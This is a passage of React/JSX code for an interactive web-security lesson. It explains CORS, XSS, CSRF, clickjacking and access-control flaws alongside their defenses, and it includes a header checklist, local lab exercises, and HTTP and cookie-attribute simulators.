                      <strong className="text-rose-400">The Credentialed Wildcard Hazard:</strong> When credentials are enabled (<code className="font-mono">withCredentials = true</code>), setting <code className="font-mono">Access-Control-Allow-Origin: *</code> causes the browser to instantly abort and reject the request!
                    </li>
                    <li>
                      <strong>Never blind-reflect Origin:</strong> Do not dynamically echo <code className="font-mono">Access-Control-Allow-Origin: req.headers.origin</code> without validating against an explicit whitelist of approved origins.
                    </li>
                  </ul>
                </div>
              </section>

              {/* 13.8 Common Web Application Attacks */}
              <section id="section-8" className="space-y-6 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <ShieldAlert className="w-4 h-4" />
                  <span>13.8 COMMON WEB APPLICATION ATTACK CLASSES</span>
                </div>
                <h2 className="text-xl font-bold text-white">
                  Cross-Site Scripting (XSS), CSRF, Clickjacking & Broken Access Control
                </h2>
                <p className="text-stone-700 text-sm leading-relaxed">
                  Web application security vulnerabilities stem from improper separation of code and
                  untrusted user data, ambient credential abuse, deceptive framing, and missing
                  backend authorization logic.
                </p>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {/* XSS */}
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 space-y-3">
                    <div className="flex items-center space-x-2 text-rose-400 font-bold text-sm">
                      <Bug className="w-4 h-4" />
                      <span>1. Cross-Site Scripting (XSS)</span>
                    </div>
                    <p className="text-xs text-stone-700 leading-relaxed">
                      Untrusted data injected into browser DOM and interpreted as executable code.
                    </p>
                    <div className="space-y-1 text-xs text-stone-600">
                      <div>• <strong>Reflected:</strong> Injected via URL parameters and echoed immediately in response.</div>
                      <div>• <strong>Stored:</strong> Persisted in database and executed whenever any user views the record.</div>
                      <div>• <strong>DOM-based:</strong> Client JavaScript unsafe sink (<code className="font-mono">innerHTML</code>, <code className="font-mono">eval</code>) processes tainted data.</div>
                    </div>
                    <div className="pt-2 border-t border-stone-200 text-xs text-emerald-300">
                      <strong>Defenses:</strong> Contextual output encoding, safe DOM APIs (<code className="font-mono">textContent</code>), strict CSP, HTML sanitization (DOMPurify).
                    </div>
                  </div>

                  {/* CSRF */}
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 space-y-3">
                    <div className="flex items-center space-x-2 text-amber-400 font-bold text-sm">
                      <Target className="w-4 h-4" />
                      <span>2. Cross-Site Request Forgery (CSRF)</span>
                    </div>
                    <p className="text-xs text-stone-700 leading-relaxed">
                      Victim browser tricked into issuing unauthorized state-changing HTTP requests
                      with automatic ambient cookies attached.
                    </p>
                    <div className="space-y-1 text-xs text-stone-600">
                      <div>• Attack relies on browser auto-attaching session cookies to foreign requests.</div>
                      <div>• Exploited via malicious hidden forms (<code className="font-mono">&lt;form method=&quot;POST&quot;&gt;</code>) auto-submitted via JavaScript.</div>
                    </div>
                    <div className="pt-2 border-t border-stone-200 text-xs text-emerald-300">
                      <strong>Defenses:</strong> Anti-CSRF Synchronizer Tokens in custom headers, <code className="font-mono">SameSite=Lax/Strict</code> cookies, re-authentication for sensitive actions.
                    </div>
                  </div>

                  {/* Clickjacking */}
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 space-y-3">
                    <div className="flex items-center space-x-2 text-orange-600 font-bold text-sm">
                      <Layers className="w-4 h-4" />
                      <span>3. Clickjacking (UI Redressing)</span>
                    </div>
                    <p className="text-xs text-stone-700 leading-relaxed">
                      Attacker overlays transparent iframe of vulnerable target application over an
                      enticing bait button, hijacking authenticated user clicks.
                    </p>
                    <div className="pt-2 border-t border-stone-200 text-xs text-emerald-300">
                      <strong>Defenses:</strong> Modern: <code className="font-mono">Content-Security-Policy: frame-ancestors &apos;none&apos;</code> or <code className="font-mono">&apos;self&apos;</code>; Legacy fallback: <code className="font-mono">X-Frame-Options: DENY</code>.
                    </div>
                  </div>

                  {/* Broken Object Level Authorization (BOLA/IDOR) */}
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 space-y-3">
                    <div className="flex items-center space-x-2 text-orange-600 font-bold text-sm">
                      <LockOpen className="w-4 h-4" />
                      <span>4. Broken Access Control (BOLA / IDOR)</span>
                    </div>
                    <p className="text-xs text-stone-700 leading-relaxed">
                      Backend trusts client-supplied identifiers (<code className="font-mono">GET /reports/9821</code>) without verifying if the authenticated session owns that specific record.
                    </p>
                    <div className="pt-2 border-t border-stone-200 text-xs text-emerald-300">
                      <strong>Defenses:</strong> Query scoping: <code className="font-mono">SELECT * FROM reports WHERE id = :id AND user_id = :authUserId</code>. Never trust client IDs.
                    </div>
                  </div>
                </div>
              </section>

              {/* 13.9 Browser Security Headers */}
              <section id="section-9" className="space-y-6 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <ShieldCheck className="w-4 h-4" />
                  <span>13.9 BROWSER SECURITY HEADERS</span>
                </div>
                <h2 className="text-xl font-bold text-white">
                  Content Security Policy (CSP), HSTS & Hardening Headers
                </h2>
                <p className="text-stone-700 text-sm leading-relaxed">
                  Security headers provide browser-enforced instructions restricting resource
                  loading, preventing MIME confusion, forcing HTTPS, and neutralizing clickjacking.
                </p>

                {/* Headers Grid */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-4 space-y-2">
                    <div className="font-mono font-bold text-orange-700">Content-Security-Policy (CSP)</div>
                    <p className="text-stone-700">
                      Controls which origins scripts, styles, fonts, and images can load from. Restricts
                      inline scripts with cryptographically generated nonces.
                    </p>
                    <div className="bg-slate-950 p-2 rounded border border-stone-200/80 font-mono text-[11px] text-stone-700">
                      default-src &apos;self&apos;; script-src &apos;self&apos; &apos;nonce-xyz&apos;; frame-ancestors &apos;none&apos;;
                    </div>
                  </div>

                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-4 space-y-2">
                    <div className="font-mono font-bold text-emerald-300">Strict-Transport-Security (HSTS)</div>
                    <p className="text-stone-700">
                      Forces browsers to communicate strictly over encrypted HTTPS for a specified
                      timeframe, preventing MITM SSL-stripping downgrades.
                    </p>
                    <div className="bg-slate-950 p-2 rounded border border-stone-200/80 font-mono text-[11px] text-stone-700">
                      Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
                    </div>
                  </div>

                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-4 space-y-2">
                    <div className="font-mono font-bold text-amber-300">X-Content-Type-Options</div>
                    <p className="text-stone-700">
                      Prevents browser MIME-type sniffing. Stops browsers from treating a user-uploaded
                      text/plain or image file as executable JavaScript.
                    </p>
                    <div className="bg-slate-950 p-2 rounded border border-stone-200/80 font-mono text-[11px] text-stone-700">
                      X-Content-Type-Options: nosniff
                    </div>
                  </div>

                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-4 space-y-2">
                    <div className="font-mono font-bold text-orange-700">Cache-Control: no-store</div>
                    <p className="text-stone-700">
                      Instructs intermediary CDN caches, proxies, and browser disks never to store
                      sensitive user reports or authenticated API responses.
                    </p>
                    <div className="bg-slate-950 p-2 rounded border border-stone-200/80 font-mono text-[11px] text-stone-700">
                      Cache-Control: no-store, no-cache, must-revalidate, private
                    </div>
                  </div>
                </div>
              </section>

              {/* 13.12 Browser DevTools Checklist */}
              <section id="section-12" className="space-y-6 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <CheckSquare className="w-4 h-4" />
                  <span>13.12 BROWSER DEVTOOLS SECURITY AUDITING</span>
                </div>
                <div className="flex items-center justify-between">
                  <h2 className="text-xl font-bold text-white">
                    13.12.4 Interactive Browser Security Review Checklist
                  </h2>
                  <span className="text-xs font-mono px-2.5 py-1 rounded bg-slate-800 text-orange-600 font-bold">
                    {completedChecks} / 8 Completed
                  </span>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
                  {[
                    {
                      key: "c1",
                      title: "1. HTTPS Enforced on All Routes",
                      desc: "HTTP requests automatically 301-redirect to HTTPS with HSTS headers active.",
                    },
                    {
                      key: "c2",
                      title: "2. Session Cookies Fully Hardened",
                      desc: "Review Secure, HttpOnly, SameSite=Lax/Strict, Path=/, and __Host- prefix.",
                    },
                    {
                      key: "c3",
                      title: "3. Server-Side Logout Invalidation",
                      desc: "Verify previous session ID cannot be reused after logging out of the application.",
                    },
                    {
                      key: "c4",
                      title: "4. Authorization on Direct API Requests",
                      desc: "Ensure accessing /api/user/report directly without valid credentials yields 401/403.",
                    },
                    {
                      key: "c5",
                      title: "5. Strict CORS Origin Whitelisting",
                      desc: "Verify Access-Control-Allow-Origin does not use wildcard * with credentials.",
                    },
                    {
                      key: "c6",
                      title: "6. Security Headers Active & Tested",
                      desc: "Confirm CSP, HSTS, frame-ancestors, and X-Content-Type-Options: nosniff are present.",
                    },
                    {
                      key: "c7",
                      title: "7. Sensitive Responses Not Cached",
                      desc: "Inspect Cache-Control: no-store on private reports and account endpoints.",
                    },
                    {
                      key: "c8",
                      title: "8. Client Parameters Cannot Grant Privileges",
                      desc: "Verify backend rejects role, isAdmin, or ownerId manipulation (mass assignment protection).",
                    },
                  ].map((item) => (
                    <div
                      key={item.key}
                      onClick={() => toggleCheck(item.key)}
                      className={`p-3.5 rounded-xl border cursor-pointer transition flex items-start space-x-3 ${
                        checklist[item.key]
                          ? "bg-cyan-950/40 border-cyan-500/60 text-stone-800"
                          : "bg-stone-50/80 border-stone-200 text-stone-600 hover:border-stone-300"
                      }`}
                    >
                      <input
                        type="checkbox"
                        checked={checklist[item.key]}
                        onChange={() => {}}
                        className="mt-0.5 rounded text-cyan-500 focus:ring-0 focus:ring-offset-0 bg-slate-800 border-stone-300"
                      />
                      <div className="space-y-1">
                        <div className="font-bold text-white text-xs">{item.title}</div>
                        <p className="text-[11px] text-stone-600">{item.desc}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </section>

              {/* 13.13 Practical Lab Workspace */}
              <section id="section-13" className="space-y-6 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <TerminalSquare className="w-4 h-4" />
                  <span>13.13 PRACTICAL LAB WORKSPACE</span>
                </div>
                <h2 className="text-xl font-bold text-white">
                  Local Web Application Security Assessment & Reporting
                </h2>
                <p className="text-stone-700 text-sm leading-relaxed">
                  Apply the six core assessment workflows (Lab A through Lab F) to evaluate your local
                  test application, then synthesize your remediation findings into a standardized
                  deliverable.
                </p>

                {/* Labs A - F Accordion / Grid */}
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 text-xs">
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3 space-y-1.5">
                    <div className="font-bold text-orange-600 font-mono">Lab A: Architecture Mapping</div>
                    <p className="text-stone-600 text-[11px]">
                      Identify frontend entry point, backend API, auth routes, and datastore boundaries.
                    </p>
                  </div>
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3 space-y-1.5">
                    <div className="font-bold text-orange-600 font-mono">Lab B: HTTP DevTools Inspection</div>
                    <p className="text-stone-600 text-[11px]">
                      Analyze request headers, status codes, redirect chains, and sensitive response payloads.
                    </p>
                  </div>
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3 space-y-1.5">
                    <div className="font-bold text-orange-600 font-mono">Lab C: Cookie Security Audit</div>
                    <p className="text-stone-600 text-[11px]">
                      Verify Secure, HttpOnly, SameSite, Domain scoping, and __Host- prefix compliance.
                    </p>
                  </div>
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3 space-y-1.5">
                    <div className="font-bold text-orange-600 font-mono">Lab D: Session Lifecycle Verification</div>
                    <p className="text-stone-600 text-[11px]">
                      Test login session generation, logout server-side revocation, and session ID rotation.
                    </p>
                  </div>
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3 space-y-1.5">
                    <div className="font-bold text-orange-600 font-mono">Lab E: Security Headers Review</div>
                    <p className="text-stone-600 text-[11px]">
                      Audit CSP, HSTS, frame-ancestors, and Cache-Control: no-store on sensitive endpoints.
                    </p>
                  </div>
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3 space-y-1.5">
                    <div className="font-bold text-orange-600 font-mono">Lab F: Authorization Boundary Testing</div>
                    <p className="text-stone-600 text-[11px]">
                      Test two separate user accounts to verify IDOR/BOLA protections on student interview reports.
                    </p>
                  </div>
                </div>

                {/* Lab Report Generator Card */}
                <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-5 space-y-4">
                  <div className="flex items-center justify-between border-b border-stone-200 pb-3">
                    <div className="flex items-center space-x-2">
                      <FileSpreadsheet className="w-5 h-5 text-orange-600" />
                      <h4 className="text-sm font-bold text-white">Lab Assessment Report Generator</h4>
                    </div>
                    <button
                      onClick={copyLabReport}
                      className="px-3 py-1.5 rounded-lg bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold text-xs flex items-center space-x-1.5 transition"
                    >
                      {reportCopied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                      <span>{reportCopied ? "Report Copied!" : "Copy Lab Report"}</span>
                    </button>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 text-xs">
                    <div>
                      <label className="text-stone-600 block mb-1 font-semibold">Project / Application</label>
                      <input
                        type="text"
                        value={labProjectName}
                        onChange={(e) => setLabProjectName(e.target.value)}
                        className="w-full bg-stone-50 border border-stone-200/80 rounded px-2.5 py-1.5 text-stone-800 font-mono"
                      />
                    </div>
                    <div>
                      <label className="text-stone-600 block mb-1 font-semibold">Environment</label>
                      <select
                        value={labEnv}
                        onChange={(e) => setLabEnv(e.target.value)}
                        className="w-full bg-stone-50 border border-stone-200/80 rounded px-2.5 py-1.5 text-stone-800"
                      >
                        <option>Local development</option>
                        <option>Authorized staging</option>
                        <option>Training lab</option>
                      </select>
                    </div>
                    <div>
                      <label className="text-stone-600 block mb-1 font-semibold">Preliminary Risk</label>
                      <select
                        value={labRisk}
                        onChange={(e) => setLabRisk(e.target.value)}
                        className="w-full bg-stone-50 border border-stone-200/80 rounded px-2.5 py-1.5 text-stone-800"
                      >
                        <option>Low</option>
                        <option>Medium</option>
                        <option>High</option>
                        <option>Critical</option>
                      </select>
                    </div>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
                    <div>
                      <label className="text-stone-600 block mb-1 font-semibold">Findings & Observations</label>
                      <textarea
                        rows={3}
                        value={labFindings}
                        onChange={(e) => setLabFindings(e.target.value)}
                        className="w-full bg-stone-50 border border-stone-200/80 rounded p-2 text-stone-800 font-mono text-[11px]"
                      />
                    </div>
                    <div>
                      <label className="text-stone-600 block mb-1 font-semibold">Remediation & Verification Plan</label>
                      <textarea
                        rows={3}
                        value={labRemediation}
                        onChange={(e) => setLabRemediation(e.target.value)}
                        className="w-full bg-stone-50 border border-stone-200/80 rounded p-2 text-stone-800 font-mono text-[11px]"
                      />
                    </div>
                  </div>
                </div>
              </section>

              {/* 13.15 Learning Resources */}
              <section id="section-15" className="space-y-4 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <BookOpen className="w-4 h-4" />
                  <span>13.15 OFFICIAL LEARNING RESOURCES</span>
                </div>
                <h2 className="text-xl font-bold text-white">
                  Standards & Authoritative Technical Documentation
                </h2>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
                  <a
                    href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Overview"
                    target="_blank"
                    rel="noreferrer"
                    className="p-3.5 rounded-xl bg-white border border-stone-200/80 shadow-xs hover:border-cyan-500/50 transition block space-y-1 group"
                  >
                    <div className="font-bold text-white group-hover:text-orange-700 flex items-center justify-between">
                      <span>MDN — HTTP Overview & Reference</span>
                      <ExternalLink className="w-3.5 h-3.5" />
                    </div>
                    <p className="text-stone-600 text-[11px]">
                      RFC 9110 HTTP semantics, status codes, methods, and request-response pipeline.
                    </p>
                  </a>
                  <a
                    href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"
                    target="_blank"
                    rel="noreferrer"
                    className="p-3.5 rounded-xl bg-white border border-stone-200/80 shadow-xs hover:border-cyan-500/50 transition block space-y-1 group"
                  >
                    <div className="font-bold text-white group-hover:text-orange-700 flex items-center justify-between">
                      <span>OWASP Session Management Cheat Sheet</span>
                      <ExternalLink className="w-3.5 h-3.5" />
                    </div>
                    <p className="text-stone-600 text-[11px]">
                      Session entropy, rotation, idle/absolute timeouts, and cookie security flags.
                    </p>
                  </a>
                  <a
                    href="https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html"
                    target="_blank"
                    rel="noreferrer"
                    className="p-3.5 rounded-xl bg-white border border-stone-200/80 shadow-xs hover:border-cyan-500/50 transition block space-y-1 group"
                  >
                    <div className="font-bold text-white group-hover:text-orange-700 flex items-center justify-between">
                      <span>OWASP HTTP Security Headers Cheat Sheet</span>
                      <ExternalLink className="w-3.5 h-3.5" />
                    </div>
                    <p className="text-stone-600 text-[11px]">
                      Production deployment patterns for CSP, HSTS, X-Content-Type-Options, and frame-ancestors.
                    </p>
                  </a>
                  <a
                    href="https://owasp.org/www-project-top-ten/"
                    target="_blank"
                    rel="noreferrer"
                    className="p-3.5 rounded-xl bg-white border border-stone-200/80 shadow-xs hover:border-cyan-500/50 transition block space-y-1 group"
                  >
                    <div className="font-bold text-white group-hover:text-orange-700 flex items-center justify-between">
                      <span>OWASP Top 10 Web Security Risks</span>
                      <ExternalLink className="w-3.5 h-3.5" />
                    </div>
                    <p className="text-stone-600 text-[11px]">
                      Broken Access Control, Cryptographic Failures, Injection, and Insecure Design principles.
                    </p>
                  </a>
                </div>
              </section>

              {/* 13.16 Key Takeaways */}
              <section id="section-16" className="space-y-4 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <Award className="w-4 h-4" />
                  <span>13.16 KEY TAKEAWAYS</span>
                </div>
                <h2 className="text-xl font-bold text-white">Summary of Core Principles</h2>
                <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-5 space-y-2.5 text-xs text-stone-700 leading-relaxed">
                  <p>
                    1. <strong>Defense in Depth:</strong> Web security depends on every layer: browser,
                    edge proxies, backend API, datastore, and third-party integrations.
                  </p>
                  <p>
                    2. <strong>Stateless Protocol, Stateful App:</strong> HTTP is stateless; sessions
                    and tokens establish application continuity. Session IDs are sensitive credentials
                    requiring high entropy, protection, validation, and revocation.
                  </p>
                  <p>
                    3. <strong>Cookie Attribute Triad:</strong> <code className="font-mono text-orange-700">Secure</code> protects transit; <code className="font-mono text-orange-700">HttpOnly</code> protects against script theft; <code className="font-mono text-orange-700">SameSite</code> neutralizes CSRF.
                  </p>
                  <p>
                    4. <strong>SOP vs CORS:</strong> Same-Origin Policy isolates documents across
                    origins. CORS allows explicit opt-in sharing; neither replaces server authorization.
                  </p>
                  <p>
                    5. <strong>The Browser Is Untrusted:</strong> Client-side validation enhances UX,
                    but all security decisions must be verified on the backend.
                  </p>
                </div>
              </section>
            </div>
          )}

          {/* TAB: SIMULATOR 1 - HTTP WIRE DISSECTOR */}
          {activeTab === "http-sim" && (
            <div className="space-y-6">
              <div className="flex items-center justify-between border-b border-stone-200 pb-4">
                <div>
                  <h3 className="text-lg font-bold text-white flex items-center space-x-2">
                    <TerminalSquare className="w-5 h-5 text-orange-600" />
                    <span>Simulator 1: HTTP Request/Response Wire Dissector</span>
                  </h3>
                  <p className="text-xs text-stone-600 mt-0.5">
                    Inspect raw HTTP streams, test method semantics, and evaluate browser security headers.
                  </p>
                </div>
                <div className="flex items-center space-x-2">
                  <select
                    value={httpScenario}
                    onChange={(e) => setHttpScenario(e.target.value)}
                    className="bg-slate-800 border border-stone-300 rounded-lg px-3 py-1.5 text-xs text-stone-800"
                  >
                    <option value="secure_api">Scenario: Authenticated API Fetch</option>
                    <option value="insecure_api">Scenario: Missing Security Headers</option>
                    <option value="redirect_open">Scenario: 302 Open Redirect Flow</option>
                    <option value="cors_preflight">Scenario: CORS OPTIONS Preflight</option>
                  </select>
                </div>
              </div>

              {/* Header Toggle Controls */}
              <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 space-y-3">
                <div className="text-xs font-bold text-stone-700">Toggle Server Defense Headers:</div>
                <div className="flex flex-wrap gap-2 text-xs">
                  <button
                    onClick={() => setEnableCsp(!enableCsp)}
                    className={`px-3 py-1.5 rounded-lg border transition ${
                      enableCsp
                        ? "bg-cyan-950/60 border-cyan-500/60 text-orange-700 font-semibold"
                        : "bg-slate-800 border-stone-300 text-stone-600"
                    }`}
                  >
                    CSP: {enableCsp ? "ENABLED" : "OFF"}
                  </button>
                  <button
                    onClick={() => setEnableHsts(!enableHsts)}
                    className={`px-3 py-1.5 rounded-lg border transition ${
                      enableHsts
                        ? "bg-emerald-950/60 border-emerald-500/60 text-emerald-300 font-semibold"
                        : "bg-slate-800 border-stone-300 text-stone-600"
                    }`}
                  >
                    HSTS: {enableHsts ? "ENABLED" : "OFF"}
                  </button>
                  <button
                    onClick={() => setEnableNosniff(!enableNosniff)}
                    className={`px-3 py-1.5 rounded-lg border transition ${
                      enableNosniff
                        ? "bg-indigo-950/60 border-indigo-500/60 text-indigo-300 font-semibold"
                        : "bg-slate-800 border-stone-300 text-stone-600"
                    }`}
                  >
                    X-Content-Type-Options: {enableNosniff ? "nosniff" : "OFF"}
                  </button>
                  <button
                    onClick={() => setEnableNoStore(!enableNoStore)}
                    className={`px-3 py-1.5 rounded-lg border transition ${
                      enableNoStore
                        ? "bg-purple-950/60 border-purple-500/60 text-orange-700 font-semibold"
                        : "bg-slate-800 border-stone-300 text-stone-600"
                    }`}
                  >
                    Cache-Control: {enableNoStore ? "no-store" : "public"}
                  </button>
                  <button
                    onClick={() => setEnableFrameAncestors(!enableFrameAncestors)}
                    className={`px-3 py-1.5 rounded-lg border transition ${
                      enableFrameAncestors
                        ? "bg-amber-950/60 border-amber-500/60 text-amber-300 font-semibold"
                        : "bg-slate-800 border-stone-300 text-stone-600"
                    }`}
                  >
                    frame-ancestors: {enableFrameAncestors ? "'none'" : "*"}
                  </button>
                </div>
              </div>

              {/* Wire Output Panels */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {/* Request Stream */}
                <div className="bg-stone-50 border border-stone-200/80 rounded-xl p-4 font-mono text-xs space-y-2">
                  <div className="text-orange-600 font-bold border-b border-stone-200 pb-1 flex items-center justify-between">
                    <span>Client HTTP Request Stream</span>
                    <span className="text-[11px] text-stone-600">RFC 9112 Wire</span>
                  </div>
                  <div className="text-emerald-400 font-bold">
                    {httpScenario === "cors_preflight" ? "OPTIONS" : httpMethod} {httpPath} HTTP/1.1
                  </div>
                  <div className="space-y-0.5 text-stone-700">
                    {httpWireData.reqHeaders.map((hdr, idx) => (
                      <div key={idx}>{hdr}</div>
                    ))}
                  </div>
                </div>

                {/* Response Stream */}
                <div className="bg-stone-50 border border-stone-200/80 rounded-xl p-4 font-mono text-xs space-y-2">
                  <div className="text-amber-400 font-bold border-b border-stone-200 pb-1 flex items-center justify-between">
                    <span>Server HTTP Response Stream</span>
                    <span className="text-[11px] text-stone-600">Status & Headers</span>
                  </div>
                  <div
                    className={`font-bold ${
                      httpWireData.respStatus.startsWith("2")
                        ? "text-emerald-400"
                        : httpWireData.respStatus.startsWith("3")
                        ? "text-amber-400"
                        : "text-rose-400"
                    }`}
                  >
                    HTTP/1.1 {httpWireData.respStatus}
                  </div>
                  <div className="space-y-0.5 text-stone-700">
                    {httpWireData.respHeaders.map((hdr, idx) => (
                      <div key={idx}>{hdr}</div>
                    ))}
                  </div>
                  {httpWireData.respBody && (
                    <div className="pt-2 border-t border-stone-200 text-stone-600">
                      <div className="text-stone-500 mb-1">[Response Payload Body]</div>
                      <pre className="text-[11px] text-stone-700 overflow-x-auto">
                        {httpWireData.respBody}
                      </pre>
                    </div>
                  )}
                </div>
              </div>

              {/* Security Audit Findings */}
              <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 space-y-3">
                <div className="flex items-center justify-between">
                  <h4 className="text-xs font-bold uppercase tracking-wider text-stone-700 flex items-center space-x-2">
                    <ShieldAlert className="w-4 h-4 text-orange-600" />
                    <span>Real-Time Security Audit Diagnostics</span>
                  </h4>
                  <span
                    className={`text-xs font-mono font-bold px-2 py-0.5 rounded ${
                      httpWireData.findings.length === 0
                        ? "bg-emerald-950 text-emerald-400 border border-emerald-800"
                        : "bg-rose-950 text-rose-400 border border-rose-800"
                    }`}
                  >
                    {httpWireData.findings.length === 0
                      ? "A+ Hardened Profile"
                      : `${httpWireData.findings.length} Vulnerabilities Detected`}
                  </span>
                </div>

                {httpWireData.findings.length === 0 ? (
                  <div className="text-xs text-emerald-400 flex items-center space-x-2 bg-emerald-950/20 p-3 rounded-lg border border-emerald-800/40">
                    <CheckCircle2 className="w-4 h-4 shrink-0" />
                    <span>
                      Excellent! Response enforces CSP, HSTS, nosniff, frame-ancestors, and no-store.
                      Protected against XSS, clickjacking, MIME-sniffing, and cache leakage.
                    </span>
                  </div>
                ) : (
                  <div className="space-y-2">
                    {httpWireData.findings.map((f, i) => (
                      <div
                        key={i}
                        className={`p-3 rounded-lg text-xs border ${
                          f.severity === "CRITICAL"
                            ? "bg-rose-950/30 border-rose-800/60 text-rose-200"
                            : "bg-amber-950/30 border-amber-800/60 text-amber-200"
                        }`}
                      >
                        <div className="font-bold flex items-center space-x-2">
                          <AlertTriangle className="w-4 h-4 shrink-0" />
                          <span>
                            [{f.severity}] {f.title}
                          </span>
                        </div>
                        <p className="mt-1 text-[11px] text-stone-700">{f.desc}</p>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          )}

          {/* TAB: SIMULATOR 2 - COOKIE ATTRIBUTES SANDBOX */}
          {activeTab === "cookie-sim" && (
            <div className="space-y-6">
              <div className="flex items-center justify-between border-b border-stone-200 pb-4">
                <div>
                  <h3 className="text-lg font-bold text-white flex items-center space-x-2">
                    <Cookie className="w-5 h-5 text-orange-600" />
                    <span>Simulator 2: Cookie Security Attributes & SameSite Contexts</span>
                  </h3>
                  <p className="text-xs text-stone-600 mt-0.5">
                    Test how Secure, HttpOnly, SameSite, and __Host- prefixes behave across various cross-site scenarios.
                  </p>
                </div>
              </div>

              {/* Cookie Configuration Controls */}
              <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 space-y-4 text-xs">
                <div className="font-bold text-stone-800">Configure Cookie Attributes:</div>
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
                  <div>
                    <label className="text-stone-600 block mb-1 font-semibold">SameSite Flag</label>
                    <select
                      value={cookieSameSite}
                      onChange={(e) => setCookieSameSite(e.target.value)}
                      className="w-full bg-stone-50 border border-stone-200/80 rounded px-2.5 py-1.5 text-stone-800"
                    >
                      <option value="Strict">SameSite=Strict</option>
                      <option value="Lax">SameSite=Lax (Standard)</option>
                      <option value="None">SameSite=None (Cross-site)</option>
                    </select>
                  </div>
                  <div>
                    <label className="text-stone-600 block mb-1 font-semibold">Cookie Prefix</label>
                    <select
                      value={cookiePrefix}
                      onChange={(e) => setCookiePrefix(e.target.value)}
                      className="w-full bg-stone-50 border border-stone-200/80 rounded px-2.5 py-1.5 text-stone-800"
                    >
                      <option value="__Host-">__Host- (Strict Host-Only)</option>
                      <option value="__Secure-">__Secure- (Requires HTTPS)</option>
                      <option value="none">No Prefix (Legacy)</option>
                    </select>
                  </div>
                  <div className="flex items-center space-x-2 pt-5">
                    <input
                      type="checkbox"
                      id="secureCheck"
                      checked={cookieSecure}
                      onChange={(e) => setCookieSecure(e.target.checked)}
                      className="rounded bg-slate-950 border-stone-200 text-cyan-500"
                    />
                    <label htmlFor="secureCheck" className="text-stone-800 font-semibold cursor-pointer">
                      Secure (HTTPS only)
                    </label>
                  </div>
                  <div className="flex items-center space-x-2 pt-5">
                    <input
                      type="checkbox"
                      id="httpOnlyCheck"
                      checked={cookieHttpOnly}
                      onChange={(e) => setCookieHttpOnly(e.target.checked)}
                      className="rounded bg-slate-950 border-stone-200 text-cyan-500"
                    />
                    <label htmlFor="httpOnlyCheck" className="text-stone-800 font-semibold cursor-pointer">
                      HttpOnly (Hide from JS)
                    </label>
                  </div>
                </div>

                <div className="pt-2 font-mono text-[11px] bg-slate-950 p-2.5 rounded border border-stone-200/80 text-orange-700">
                  {cookieSimulation.cookieHeader}
                </div>

                {cookieSimulation.prefixErrors.length > 0 && (
                  <div className="p-3 bg-rose-950/40 border border-rose-800 rounded-lg text-rose-300 text-xs space-y-1">
                    <div className="font-bold flex items-center space-x-1.5">
                      <AlertTriangle className="w-4 h-4 shrink-0" />
                      <span>Cookie Prefix Constraint Violation:</span>
                    </div>
                    {cookieSimulation.prefixErrors.map((err, i) => (
                      <div key={i}>• {err}</div>
                    ))}
                  </div>
                )}
              </div>

              {/* Context Selector Buttons */}
              <div className="space-y-2">
                <div className="text-xs font-bold text-stone-700">Select Browser Request Context:</div>
                <div className="grid grid-cols-1 sm:grid-cols-3 lg:grid-cols-5 gap-2 text-xs">
                  <button
                    onClick={() => setTestContext("same_site_nav")}
                    className={`p-2.5 rounded-lg border text-left transition ${
                      testContext === "same_site_nav"
                        ? "bg-cyan-950/60 border-cyan-500 text-orange-700 font-bold"
                        : "bg-stone-50 border-stone-200 text-stone-600 hover:bg-slate-850"
                    }`}
                  >
                    1. Same-Site Link Click
                  </button>
                  <button
                    onClick={() => setTestContext("top_level_cross_nav")}
                    className={`p-2.5 rounded-lg border text-left transition ${
